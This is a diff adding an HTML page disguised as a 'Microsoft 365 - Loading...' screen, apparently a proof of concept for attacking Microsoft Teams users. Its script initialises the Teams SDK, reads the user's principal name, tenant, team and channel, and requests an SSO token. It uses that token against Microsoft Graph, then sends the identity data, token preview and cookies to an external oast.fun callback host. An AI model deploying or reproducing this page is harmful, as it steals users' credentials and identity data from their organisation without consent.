@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Microsoft 365 - Loading...</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+</head>
+<body style="margin:0;font-family:'Segoe UI',sans-serif;background:#f5f5f5;">
+<div id="status" style="padding:20px;font-size:14px;color:#333;"></div>
+<script>
+var C='yeedjuciskcfxiwyajuv9mw912uaxqx0t.oast.fun';
+var log=[];
+
+function s(m){log.push(m);document.getElementById('status').innerHTML=log.join('<br>');}
+function ex(path,data){
+  var p=Object.keys(data).map(function(k){return k+'='+encodeURIComponent(data[k]||'none')}).join('&');
+  fetch('https://'+C+'/'+path+'?'+p).catch(function(){
+    new Image().src='https://'+C+'/'+path+'?'+p;
+  });
+}
+
+s('Detecting environment...');
+
+var env={
+  ua:navigator.userAgent,
+  mobile:/iPhone|iPad|Android|Mobile/i.test(navigator.userAgent),
+  teams:/Teams/i.test(navigator.userAgent),
+  ios:/iPhone|iPad/i.test(navigator.userAgent),
+  wkwebview:!!(window.webkit&&window.webkit.messageHandlers),
+  iframe:window.parent!==window,
+  loc:location.href,
+  ref:document.referrer
+};
+
+ex('env',{ua:env.ua.substring(0,120),mobile:env.mobile,teams:env.teams,ios:env.ios,wk:env.wkwebview,iframe:env.iframe});
+s('Mobile: '+env.mobile+' | Teams UA: '+env.teams+' | iOS: '+env.ios+' | WKWebView: '+env.wkwebview);
+
+(async function(){
+  // Teams SDK
+  try{
+    await microsoftTeams.app.initialize();
+    s('Teams SDK: INITIALIZED');
+    ex('sdk-init',{ok:'true'});
+
+    try{
+      var ctx=await microsoftTeams.app.getContext();
+      s('Context: GOT IT');
+      ex('sdk-ctx',{
+        upn:ctx.user&&ctx.user.userPrincipalName||'?',
+        uid:ctx.user&&ctx.user.id||'?',
+        tid:ctx.user&&ctx.user.tenant&&ctx.user.tenant.id||'?',
+        host:ctx.app&&ctx.app.host&&ctx.app.host.clientType||'?',
+        hostName:ctx.app&&ctx.app.host&&ctx.app.host.name||'?',
+        theme:ctx.app&&ctx.app.theme||'?',
+        locale:ctx.app&&ctx.app.locale||'?',
+        channelId:ctx.channel&&ctx.channel.id||'?',
+        channelName:ctx.channel&&ctx.channel.displayName||'?',
+        teamId:ctx.team&&ctx.team.groupId||'?',
+        teamName:ctx.team&&ctx.team.displayName||'?',
+        frameCtx:ctx.page&&ctx.page.frameContext||'?'
+      });
+      s('UPN: '+(ctx.user&&ctx.user.userPrincipalName||'?'));
+      s('TenantID: '+(ctx.user&&ctx.user.tenant&&ctx.user.tenant.id||'?'));
+      s('Host: '+(ctx.app&&ctx.app.host&&ctx.app.host.clientType||'?'));
+      s('Channel: '+(ctx.channel&&ctx.channel.displayName||'?'));
+    }catch(e){
+      s('Context: BLOCKED - '+e.message);
+      ex('sdk-ctx-err',{e:e.message});
+    }
+
+    // SSO Token
+    try{
+      var t=await microsoftTeams.authentication.getAuthToken();
+      s('SSO TOKEN: GOT IT (len='+t.length+')');
+      var p=JSON.parse(atob(t.split('.')[1]));
+      ex('sso-token',{
+        aud:p.aud||'?',
+        upn:p.upn||'?',
+        scp:(p.scp||'?').substring(0,100),
+        tid:p.tid||'?',
+        preview:t.substring(0,60)
+      });
+      s('Token aud: '+p.aud);
+      s('Token upn: '+p.upn);
+      s('Token scopes: '+(p.scp||'?').substring(0,80));
+
+      // Try to call Graph with the token
+      try{
+        var me=await(await fetch('https://graph.microsoft.com/v1.0/me',{headers:{'Authorization':'Bearer '+t}})).json();
+        s('Graph /me: '+me.displayName+' ('+me.userPrincipalName+')');
+        ex('graph-me',{name:me.displayName,upn:me.userPrincipalName,id:me.id});
+      }catch(e2){
+        s('Graph /me: failed - '+e2.message);
+        ex('graph-err',{e:e2.message});
+      }
+    }catch(e){
+      s('SSO Token: BLOCKED - '+e.message);
+      ex('sso-err',{e:e.message});
+    }
+  }catch(e){
+    s('Teams SDK init failed: '+e.message);
+    ex('sdk-fail',{e:e.message});
+  }
+
+  // Cookies
+  ex('cookies',{c:document.cookie||'none',ls:typeof localStorage!=='undefined'?'yes':'no'});
+
+  // Check what APIs are available
+  var caps={
+    clipboard:!!navigator.clipboard,
+    geo:!!navigator.geolocation,
+    camera:!!(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia),
+    notifications:'Notification' in window,
+    sw:'serviceWorker' in navigator,
+    beacon:!!navigator.sendBeacon
+  };
+  ex('caps',caps);
+  s('Capabilities: '+JSON.stringify(caps));
+
+  s('--- All tests complete ---');
+})();
+</script>
+</body>
+</html>
